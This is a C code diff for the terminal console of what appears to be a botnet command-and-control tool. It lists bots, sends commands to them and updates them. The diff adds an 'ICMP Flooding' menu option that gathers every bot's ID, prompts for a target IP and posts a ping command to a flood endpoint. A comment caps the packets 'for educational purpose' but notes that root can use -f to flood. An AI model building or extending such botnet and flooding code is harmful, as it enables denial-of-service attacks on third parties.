@@ -12,6 +12,7 @@
 #include <sys/stat.h>
 #include <errno.h>
 #include <limits.h>
+#include <arpa/inet.h>
 
 // Global variable to track the number of lines used by the last print_wrapped call
 int line_offset = 0;
@@ -24,7 +25,7 @@ static size_t write_callback(void *contents, size_t size, size_t nmemb, void *us
 }
 
 // Menu options
-#define NUM_OPTIONS 7
+#define NUM_OPTIONS 8
 const char *menu_options[NUM_OPTIONS] = {
     "Display Bots",
     "Download from bot",
@@ -32,6 +33,7 @@ const char *menu_options[NUM_OPTIONS] = {
     "Send Command to Bot(s)",
     "Get Botfile's Last Lines",
     "Update bots",
+    "ICMP Flooding",
     "Quit"
 };
 
@@ -89,7 +91,7 @@ void *interactive_menu() {
         print_ascii_art();
 
         // Display the menu
-        int current_row = 7; // Start at row 7
+        int current_row = 8; // Start at row 7
         for (int i = 0; i < NUM_OPTIONS; i++) {
             if (i == highlight) {
                 attron(A_BOLD | COLOR_PAIR(1)); // Highlight the selected option in blue
@@ -151,6 +153,9 @@ void *interactive_menu() {
                         break;
                     case 5:
                         update_bots();
+                        break;
+                    case 6:
+                        icmp_flood();
                         break;
                 }
             }
@@ -1989,4 +1994,122 @@ void update_bots() {
 
     refresh();
     getch();
+}
+
+void icmp_flood() {
+    CURL *curl;
+    char response[4096] = {0};
+
+    curl = curl_easy_init();
+    if (!curl) return;
+    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/bots");
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    if (curl_easy_perform(curl) != CURLE_OK) {
+        curl_easy_cleanup(curl);
+        return;
+    }
+    curl_easy_cleanup(curl);
+
+    cJSON *json = cJSON_Parse(response);
+    if (!json || !cJSON_IsArray(json)) {
+        cJSON_Delete(json);
+        return;
+    }
+    int count = cJSON_GetArraySize(json);
+    char selected_bots[2048] = {0};
+    for (int i = 0; i < count; ++i) {
+        cJSON *bot = cJSON_GetArrayItem(json, i);
+        cJSON *id = cJSON_GetObjectItem(bot, "id");
+        if (cJSON_IsString(id)) {
+            if (i > 0) strcat(selected_bots, ",");
+            strcat(selected_bots, id->valuestring);
+        }
+    }
+    cJSON_Delete(json);
+
+    bool ip_not_valid = true;
+    char ip[16];
+    struct in_addr addr;
+    while (ip_not_valid) {
+        clear();
+        attron(A_BOLD | COLOR_PAIR(2));
+        mvprintw(LINES - 1, 0, "[q + Enter] to quit");
+        attroff(A_BOLD | COLOR_PAIR(2));
+        mvprintw(0, 0, "IP of target : ");
+        echo();
+        getnstr(ip, sizeof(ip) - 1);
+        noecho();
+        if (strcmp(ip, "q") == 0) {
+            return;
+        }
+        if (inet_pton(AF_INET, ip, &addr) == 1) {
+            ip_not_valid = false;
+            break;
+        } else {
+            attron(COLOR_PAIR(4));
+            mvprintw(2, 0, "\"%s\" is not valid IPv4, try again\n", ip);
+            attroff(COLOR_PAIR(4));
+            mvprintw(3, 0, "Press any key to continue");
+            refresh();
+            getch();
+        }
+    }
+
+    char cmd_id[64];
+    mvprintw(1, 0, "Command ID: ");
+    echo(); getnstr(cmd_id, sizeof(cmd_id)-1); noecho();
+    if (strcmp(cmd_id, "q") == 0) {
+        return; // Exit on 'q'
+    }
+
+    char delay_str[16] = "0";
+    mvprintw(2, 0, "Delay (s, défaut 0): "); echo(); getnstr(delay_str, sizeof(delay_str)-1); noecho();
+    if (strcmp(delay_str, "q") == 0) {
+        return; // Exit on 'q'
+    }
+    
+    char expected_code_str[16] = "0";
+    mvprintw(3, 0, "Expected exit code (défaut 0): "); echo(); getnstr(expected_code_str, sizeof(expected_code_str)-1); noecho();
+    if (strcmp(expected_code_str, "q") == 0) {
+        return; // Exit on 'q'
+    }
+
+    char number_of_paquets[2]; // for educational purpose, so not more than 9 ICMP packets
+    mvprintw(4, 0, "Number of ICMP paquets (default 1): "); echo(); getnstr(number_of_paquets, sizeof(number_of_paquets)-1); noecho();
+    if (strcmp(number_of_paquets, "q") == 0) {
+        return; // Exit on 'q'
+    }else if(strcmp(number_of_paquets, "") == 0){
+        strcpy(number_of_paquets, "1");
+    }
+
+    char params[512];
+    snprintf(params, sizeof(params), "-c%s %s", number_of_paquets, ip); 
+    // If the client is root, we can use -f to flood
+
+    char post_data[4096];
+    snprintf(post_data, sizeof(post_data),
+             "bot_ids=%s&cmd_id=%s&program=ping&params=%s&delay=%s&expected_code=%s",
+             selected_bots, cmd_id, params, delay_str, expected_code_str);
+
+    memset(response, 0, sizeof(response));
+    curl = curl_easy_init();
+    if (!curl) return;
+    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/flood");
+    curl_easy_setopt(curl, CURLOPT_POST, 1L);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+
+    cJSON *resp_json = cJSON_Parse(response);
+    int targeted = 0;
+    if (resp_json) {
+        cJSON *t = cJSON_GetObjectItem(resp_json, "targeted_clients");
+        if (cJSON_IsNumber(t)) targeted = t->valueint;
+        cJSON_Delete(resp_json);
+    }
+    mvprintw(7, 0, "Targeted clients : %d", targeted);
+    refresh(); getch();
 }
